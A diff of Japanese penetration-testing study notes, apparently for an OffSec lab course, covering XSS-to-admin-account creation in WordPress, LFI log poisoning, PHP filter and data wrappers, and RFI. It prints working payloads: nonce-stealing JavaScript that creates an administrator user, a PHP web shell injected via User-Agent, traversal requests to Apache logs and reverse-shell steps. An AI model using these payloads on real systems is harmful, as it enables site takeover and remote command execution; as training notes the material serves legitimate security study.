@@ -86,7 +86,7 @@ var nonce = nonceMatch[1];
 - 3行目にアクション実行先のHTTPリクエスト
 - 4行目第三引数をfalseとすることで、同期通信になる。nonceを確実に抽出する目的
 
-- 抽出したnonceを使用してアクションを実行するリクエストを作成する
+抽出したnonceを使用してアクションを実行するリクエストを作成する
 ```js
 var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
 ajaxRequest = new XMLHttpRequest();
@@ -94,9 +94,10 @@ ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 ajaxRequest.send(params);
 ```
-	(1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している)
+- 1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している
 
 4. [Web攻撃の難読化](../Cheatsheet/Evasion(試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。
+
 5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）
 
 ![](../画像ファイル/Pasted%20image%2020250321200240.png)
@@ -117,28 +118,26 @@ ajaxRequest.send(params);
 
 ## File Inclusion
 
-### 基本情報
+### File Inclusionとは
 
-- File InclusionはPath traversalと似ているが、
+- Path traversalと似ているが、以下の違いがある
 	- Path traversal: 任意のファイルを読みとる
-	- File inclusion: 任意のファイルを実行するという違いがある。
+	- File inclusion: 任意のファイルを実行する
 
-- File inclusionでは、ファイルを実行することで、Path traversalと同様にファイルの中身を表示するだけでなく、==任意のコマンドを実行させる==ことが可能であるため、Path traversalよりも深刻な脆弱性
+- File inclusionでは、ファイルを実行することで、Path traversalと同様にファイルの中身を表示するだけでなく、==任意のコマンドを実行させる==ことが可能であるため、Path traversalよりも深刻な脆弱性とされる
 
 - LFIとRFIがある：
-	- LFIがターゲットのローカル環境にあるファイルを読み取らせる
-	- RFIはリモート（多くは攻撃者）のファイルを読み取らせる
+	- LFI: ターゲットのローカル環境にあるファイルを読み取らせる
+	- RFI: リモート（多くは攻撃者）のファイルを読み取らせる
 
 ### LFI x ログポイズニング 
 
-- 概要：Webサーバーが取得するアクセスログに悪意あるWeb shellを読み込ませて実行させる
-- 条件：どの値が攻撃者によって制御可能なのかを知っていること
+- 概要：Webサーバーが取得するアクセスログに悪意あるWebShellを読み込ませて、実行させる
+- 攻撃条件：どの値が攻撃者によって制御可能なのかを知っていること
 	- 今回は、ログファイルがRead, Write可能であるため、ログファイルの中身を明らかにすること
-		- LFIでファイルの内容を表示する
 
-- 汚染するログファイルの場所については、ドキュメントを読んで探す。Windowsの場合は、アプリケーション固有の場所にある（例えば、XAMPPが稼働している場合は、`C:¥xampp¥apache¥logs¥`にある）
-
-- レスポンスの`Server`ヘッダにもサーバーの情報があるので見逃さない
+- 汚染するログファイルの場所については、Webサーバーソフトウェアのドキュメントを読んで探す
+	- Windowsの場合は、アプリケーション固有の場所にある（例えば、XAMPPが稼働している場合は、`C:¥xampp¥apache¥logs¥`にある）
 
 #### LFI x ログポイズニングの流れ
 
@@ -149,9 +148,9 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 ...
 ```
-（↑User-agentがログに記録されることがわかる＝ユーザー制御可能）
+- ↑User-agentがログに記録されることがわかる＝ユーザー制御可能
 
-2. ログを取得しているパス(上記3行目GET以降)に対し、ユーザー制御可能な値（今回はUser-Agent）にWeb shellペイロードを実装し、HTTPリクエスト
+2. ログを取得しているパス(上記3行目GET以降)に対し、ユーザー制御可能な値（今回はUser-Agent）にWebShellペイロードを実装し、HTTPリクエスト
 ```php
 <?php echo system($_GET['cmd']); ?>
 ```
@@ -160,11 +159,11 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 
 $$User-Agentにペイロードを注入$$
 
-3. ステップ２でWeb shellペイロードがログファイルに記録されているかどうかを確認するため、プロセスを閲覧する（URL encodeすること）
+3. ステップ２でWebShellペイロードがログファイルに記録されているかどうかを確認するため、プロセスを閲覧する（URL encodeすること）
 ```http
 meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
 ```
-（`ps`の結果が返ったら成功）
+- `ps`の結果が返ったら成功
 
 4. リバースシェルリスナーを立て、[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#bashでリバースシェルを確立する基本的なコマンド)をURLエンコードして実行
 
@@ -198,7 +197,7 @@ http://example.com/index.php?page=admin.php
 ```
 GET /index.php?page=php://filter/resource=admin.php
 ```
-　（resourceはこのwrapperに必要なパラメタ）
+- resourceはこのwrapperに必要なパラメタ
 
 4. 指定したresourceの中身をすべてをbase64にエンコードする
 ```
@@ -212,9 +211,9 @@ dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRt
 ...
 ```
 
-5. ターミナル上で、Base64 で取得したデータを `base64 -d` でデコードすると、中身がすべて表示される。
+5. ターミナル上で、Base64 で取得したデータを `base64 -d` でデコードすると、中身がすべて表示される
 ```zsh
-echo "[basee64 encoded resource]" | base64 -d
+echo "<basee64_encoded_resource>" | base64 -d
 ```
 
 #### data://
@@ -222,17 +221,16 @@ echo "[basee64 encoded resource]" | base64 -d
 ##### 概要
 
 - 用途：任意のコマンドを実行させる
-- シチュエーション：
+- 攻撃シチュエーション：
 	- 対象のマシンに直接PHPコードを埋め込むことができない場合(※)
-	- また、HTTPリクエストでファイルを指定しているとき。
+	- また、HTTPリクエストでファイルを指定しているとき
 		- (※：`<?php echo system($_GET['cmd']); ?>`などをwebアプリに埋め込むことができずwebshell使えないときなど）
 	- ⚠️注意：PHPの[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))と`allow_url_fopen`が有効のときしか使えない(デフォルト無効になっている)
 - 仕組み：データ要素をプレーンテキストもしくはbase64エンコードして実行中のwebアプリのコードに埋め込む
 
-
 ##### data wrapperによるRCE手順
 
-1. HTTPリクエストでファイルを指定している箇所を見つける。以下例↓
+1. HTTPリクエストでファイルを指定している箇所を見つける（以下例↓）
 ```
 http://example.com/index.php?page=admin.php
 ```
@@ -262,11 +260,11 @@ GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls"
 
 - 用途：LFIとほぼ同じ。異なるのは、HTTP1やSMB2を介して<u>リモートシステム</u>(攻撃者のホストするサーバ等)からファイルをインクルード可能なところ
 - シチュエーション・使い方：LFIと同じ → [Module 8 x Module 9： Web Application Attacks](#LFI%20x%20ログポイズニング)
-- ⚠️注意：PHPの[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))が有効でないと使えない（デフォルト無効）
+- ⚠️注意：PHPの🔗[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))が有効でないと使えない（デフォルト無効）
 
 #### RFI実行手順
 
-1. ターゲットのWebアプリに実行させたいファイル（Webshell）などを攻撃者のマシンにホストする
+1. ターゲットのWebアプリに実行させたいファイル（WebShell）などを攻撃者のマシンにホストする
 	- `/usr/share/webshells/php`
 	- pentest-monkeyのreverse shellなど
 
